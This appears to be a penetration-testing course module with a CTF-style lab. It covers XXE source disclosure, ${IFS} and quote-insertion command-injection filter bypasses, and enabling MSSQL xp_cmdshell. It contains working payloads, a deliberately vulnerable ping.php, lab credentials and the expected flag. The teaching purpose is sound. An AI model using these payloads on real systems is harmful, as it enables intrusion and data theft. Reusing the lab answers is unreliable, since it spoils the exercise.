---
id: mod-pt-302
track_id: track-pentest
slug: injection-flaws-sqli-xp-cmdshell-xxe-filter-bypass
title: '302: Injection Flaws: SQLi (xp_cmdshell), XXE & Filter-Bypassed RCE'
difficulty: Intermediate
order_index: 10
estimated_minutes: 40
lab_type: terminal
lab_briefing: Target 10.10.14.52 runs an XML-based diagnostic portal (/api/xml-check) and an MSSQL inventory backend. (1) Exploit XXE with php://filter to read the source code of ping.php and inspect its input blacklist, (2) bypass the space and "cat" keyword filter using ${IFS} and quote insertion (c'a't), and (3) enable xp_cmdshell via SQL injection to capture the combined server compromise flag.
expected_flag: FLAG{XXE_IFS_BYPASS_MSSQL_XPCMDSHELL}
hint: Run the XXE source disclosure, the ${IFS} + c'a't filter bypass, and the impacket-mssqlclient xp_cmdshell execution (Step 3) to obtain FLAG{XXE_IFS_BYPASS_MSSQL_XPCMDSHELL}.
lab_config:
  target_ip: 10.10.14.52
  quick_commands:
    - curl -s -X POST http://10.10.14.52/api/xml-check -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=ping.php">]><check><host>&xxe;</host></check>' | base64 -d
    - curl -s "http://10.10.14.52/ping.php?ip=127.0.0.1;c'a't\${IFS}/opt/stage1_sql_creds.txt"
    - impacket-mssqlclient sa:SqlProd#2026!@10.10.14.52 -windows-auth -command "enable_xp_cmdshell; xp_cmdshell type C:\\Users\\Administrator\\Desktop\\flag.txt"
  commands:
    curl -s -X POST http://10.10.14.52/api/xml-check -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=ping.php">]><check><host>&xxe;</host></check>' | base64 -d: |-
      <?php
      // ping.php - Internal Network Monitor
      $ip = $_GET["ip"];
      if (strpos($ip, " ") !== false || strpos($ip, "cat") !== false) {
        die("WAF BLOCKED: Spaces and cat keyword are prohibited!");
      }
      system("ping -c 1 " . $ip);
      ?>
    curl -s "http://10.10.14.52/ping.php?ip=127.0.0.1;c'a't\${IFS}/opt/stage1_sql_creds.txt": |-
      PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
      64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.021 ms

      # Recovered Backend MSSQL Service Credentials:
      MSSQL_HOST=10.10.14.52
      MSSQL_USER=sa
      MSSQL_PASS=SqlProd#2026!
    impacket-mssqlclient sa:SqlProd#2026!@10.10.14.52 -windows-auth -command "enable_xp_cmdshell; xp_cmdshell type C:\\Users\\Administrator\\Desktop\\flag.txt": |-
      Impacket v0.12.0 - Copyright Fortra, LLC
      [*] Encryption required, switching to TLS
      [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
      [*] INFO(WIN-SQL01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
      output
      ------------------------------------------------
      FLAG{XXE_IFS_BYPASS_MSSQL_XPCMDSHELL}
---

# 302: Injection Flaws: SQLi (xp_cmdshell), XXE & Filter-Bypassed RCE

## Sub-Unit 8.1: Escalating SQL Injection to OS Execution (xp_cmdshell)

In enterprise engagements (PEN-200 Module 09 & HTB CPTS), SQL Injection is not merely for dumping tables—it is a primary foothold vector for operating system command execution:
- **MySQL / PostgreSQL**: Reading sensitive files (`LOAD_FILE('/etc/passwd')`) or writing web shells (`INTO OUTFILE '/var/www/html/cmd.php'`, `COPY ... TO PROGRAM`).
- **Microsoft SQL Server (`xp_cmdshell`)**: When the database service runs as `sa` or high privilege, you can re-enable `xp_cmdshell` over SQLi or `impacket-mssqlclient` to execute OS commands directly:
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## Sub-Unit 8.2 & 8.3: XXE Source Disclosure & OS Command Injection Filter Bypass

When web applications pass user input to system shells (e.g., network ping/diagnostic utilities), developers often apply naive blacklists blocking spaces (` `), slashes (`/`), or keywords (`cat`, `whoami`). Operators bypass these filters systematically:

| Restricted Character / Keyword | Linux Bypass Technique | Example Payload |
| --- | --- | --- |
| **Spaces (` `)** | Internal Field Separator (`$IFS` or `${IFS}`) or Brace Expansion | `127.0.0.1;cat${IFS}/etc/flag.txt` |
| **Slashes (`/`)** | Environment variable slicing (`${PATH:0:1}` evaluates to `/`) | `cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd` |
| **Blacklisted Keywords (`cat`)** | Single/double quote insertion or inline Base64 decoding | `c'a't${IFS}/etc/flag.txt` |

Furthermore, **XML External Entity (XXE)** injection paired with PHP `php://filter/convert.base64-encode/resource=index.php` allows you to read the backend PHP source code first, exposing the exact blacklist regex before crafting your command injection payload!
